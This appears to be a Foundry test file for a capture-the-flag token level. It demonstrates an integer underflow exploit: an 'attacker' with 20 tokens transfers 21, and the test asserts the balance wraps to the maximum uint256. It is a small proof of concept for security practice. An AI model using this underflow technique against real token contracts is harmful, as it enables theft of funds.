// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../lib/forge-std/src/Test.sol";
import {console} from "../lib/forge-std/src/console.sol";
import "../src/tokenlevel5.sol";

contract TokenTest is Test {

    Token public TokenContract; // the victim contract
    address owner = address(0x1337);
    address attacker = address(0x1338);
    address attacker2 = address(0x1339);

    function setUp() public {
        vm.startPrank(owner);
        // create a new instance of the victim contract
        TokenContract = new Token(21000000); // initial supply is 21 million
        // set attacker balance to 20 tokens 
        TokenContract.transfer(attacker, 20);
        vm.stopPrank();
    }

    function test_assertBalanceTo20() public {
        assert(TokenContract.balanceOf(attacker) == 20);
    }

    function test_OverflowHack() public {
        vm.startPrank(attacker);
        // call the transfer function with 21 tokens
        TokenContract.transfer(attacker2, 21);
        vm.stopPrank();
        // check if the attacker2 balance is 21 tokens
        assert(TokenContract.balanceOf(attacker2) == 21);
        //check the attacker balance to max
        assert(TokenContract.balanceOf(attacker) == (2**256 - 1)); // here the balance of the attacker would become max uint256 after overflowing
    }


}